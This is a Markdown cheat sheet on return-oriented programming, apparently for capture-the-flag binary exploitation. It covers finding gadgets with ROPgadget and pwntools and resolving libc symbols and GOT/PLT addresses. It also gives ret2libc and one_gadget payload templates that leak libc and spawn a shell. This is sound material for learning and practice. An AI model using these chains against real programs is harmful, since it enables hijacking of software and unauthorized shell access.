# Gadgets

## Finding Gadgets

### ROPgadget (CLI tool)

```bash
# Install
pip install ROPgadget

# Basic
ROPgadget --binary ./binary

# With filters
ROPgadget --binary ./binary | grep "pop rdi"
ROPgadget --binary ./binary | grep "ret"
ROPgadget --binary ./binary | grep "syscall"
ROPgadget --binary ./binary | grep "pop rdi ; pop rsi"

# Dual gadget search (chain)
ROPgadget --binary ./binary | grep "pop rdi" | grep "ret"

# Save to file
ROPgadget --binary ./binary > gadgets.txt

# From libc
ROPgadget --binary ./libc.so.6 > libc_gadgets.txt
```

### pwntools ROP class

```python
from pwn import *

e = ELF('./binary')

rop = ROP(e)

# Find specific gadget
rop.find_gadget(['pop rdi', 'ret'])       # returns Gadget object
rop.find_gadget(['ret'])                   # ret gadget (for alignment)
rop.find_gadget(['syscall', 'ret'])
rop.find_gadget(['pop rsi', 'ret'])
rop.find_gadget(['pop rdx', 'ret'])
rop.find_gadget(['leave', 'ret'])

# Get address
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
ret = rop.find_gadget(['ret']).address

# Or directly (shorter)
pop_rdi = rop.rdi.address if hasattr(rop, 'rdi') else ...

# Search by regex
rop.gadgets['pop rdi']          # may raise KeyError
```

## Finding Symbols / Addresses

### pwntools ELF

```python
e = ELF('./binary')
libc = ELF('./libc.so.6')

# --- Functions ---
e.symbols['main']                # address of main
e.symbols['calc']
libc.symbols['system']
libc.symbols['puts']
libc.symbols['execve']
libc.symbols['read']
libc.symbols['write']

# --- GOT / PLT ---
e.got['puts']                    # GOT address (contains libc addr after resolve)
e.got['read']
e.got['__libc_start_main']

e.plt['puts']                    # PLT address (callable wrapper)
e.plt['read']
e.plt['printf']

# --- Sections ---
e.bss()                          # BSS base address
e.sections['.bss'].header.sh_addr
e.bss(offset=0x100)              # BSS + offset

e.entry                          # entry point

# --- Data ---
e.search(b'/bin/sh').__next__()  # find /bin/sh string
e.search(b'flag').__next__()     # find "flag"

# Search in range
list(e.search(b'/bin/sh'))       # all occurrences
```

### Search in libc

```python
libc = ELF('./libc.so.6')

# /bin/sh string
bin_sh = next(libc.search(b'/bin/sh\x00'))

# Strings for ret2libc
libc.symbols['system']
libc.symbols['execve']
libc.symbols['puts']
libc.symbols['__libc_start_main']
libc.symbols['environ']          # stack leak

# Standard offsets (known libc)
libc.address = leaked - libc.symbols['puts']
log.info(f"libc base: {hex(libc.address)}")

# Now everything adjusts
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))
```

## pwntools ROP (Building Chains)

### Automatic chain construction

```python
rop = ROP(e)

# Simple call
rop.puts(e.got['puts'])          # puts(puts@got) → leaks libc address
rop.main()                        # return to main

# Build payload
payload = flat({offset: rop.chain()})

# Print chain to verify
log.info(rop.dump())
# Example output:
# 0x0000:           0x401016 pop rdi; ret
# 0x0008:           0x404018 [arg0] rdi = got.puts
# 0x0010:           0x401030 puts
# 0x0018:           0x401124 main

# With libc
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh')))
payload2 = flat({offset: rop2.chain()})
```

### Manual chain

```python
# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address
ret = rop.find_gadget(['ret']).address

# Stage 1: leak
payload1 = flat({
    offset: [
        pop_rdi,
        e.got['puts'],
        e.plt['puts'],
        e.symbols['main']               # come back
    ]
})

# Stage 2: shell
payload2 = flat({
    offset: [
        ret,                            # stack alignment (16B)
        pop_rdi,
        next(libc.search(b'/bin/sh')),
        libc.symbols['system']
    ]
})
```

### Calling conventions (x86-64)

```python
# arg1 = rdi, arg2 = rsi, arg3 = rdx, arg4 = rcx, arg5 = r8, arg6 = r9

# Example: read(0, bss, 0x100)
# read(fd=0, buf=bss, count=0x100)
rop.read(0, e.bss(), 0x100)

# Manual: need pop rdi, pop rsi, pop rdx
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address       # or pop rsi ; pop r15 ; ret
pop_rdx = rop.find_gadget(['pop rdx', 'ret']).address       # or pop rdx ; pop rbx ; ret
ret = rop.find_gadget(['ret']).address

chain = [
    pop_rdi, 0,
    pop_rsi, e.bss(),
    pop_rdx, 0x100,
    libc.symbols['read'],
    pop_rdi, e.bss(),
    libc.symbols['system']
]
```

## one\_gadget (Magic Gadgets)

```bash
# Install
gem install one_gadget

# Find magic gadgets in libc
one_gadget ./libc.so.6

# Output:
# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL
#
# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL
#
# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# In pwntools
one_gadgets = [0xe3afe, 0xe3b01, 0xe3b04]

# Use after libc leak
libc.address = leak - libc.symbols['puts']
og = libc.address + one_gadgets[0]

# Simple payload: just overwrite return addr with one_gadget
payload = flat({offset: og})

# Sometimes need stack alignment (add ret before)
payload = flat({offset: [ret, og]})

# If constraints fail, try other offsets or adjust regs
# Common: need rsp+0x40 == NULL → just add more padding
```

## Common Gadget Addresses

### x86-64 (common in libc)

```
pop rdi; ret
pop rsi; ret
pop rdx; ret
pop rcx; ret
pop rax; ret
pop rsi; pop r15; ret      # common in __libc_csu_init
pop rdx; pop rbx; ret
pop rcx; pop rbx; ret
leave; ret                 # stack pivot
ret                        # just return (alignment)
syscall; ret
syscall
int 0x80                   # 32-bit syscall
```

### Check what's available

```python
# Quick scan
rop = ROP(e)
for name, gadget in sorted(rop.gadgets.items()):
    if 'pop' in name:
        print(hex(gadget.address), name)

# Or grep
log.info(rop.dump())
```
